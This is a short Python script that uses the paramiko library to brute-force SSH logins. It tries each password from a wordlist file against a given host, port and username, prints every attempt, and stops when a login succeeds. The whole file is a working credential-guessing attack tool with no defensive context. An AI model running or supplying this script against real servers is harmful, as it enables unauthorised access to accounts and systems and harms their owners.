# -*- encoding: utf-8 -*-
import paramiko

def ssh_connect(hostname, port, dictionary, username):
    ssh_value = {}
    ssh_value_success = []
    ssh_value_failed = []

    s = paramiko.SSHClient()
    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    f = open(dictionary, 'r')
    for password in f:
        try:
            s.connect(hostname, port, username, password.strip())
            print("The password {0} is success.".format(password.strip()))
            ssh_value_success.append(1)
            ssh_value_success.append(password.strip())
            break
        except Exception as e:
            print("The password {0} is {1}".format(password.strip(),e))
            s.close()
            ssh_value_failed.append(0)

    ssh_value['ssh_value_success'] = ssh_value_success
    ssh_value['ssh_value_failed'] = ssh_value_failed
    return ssh_value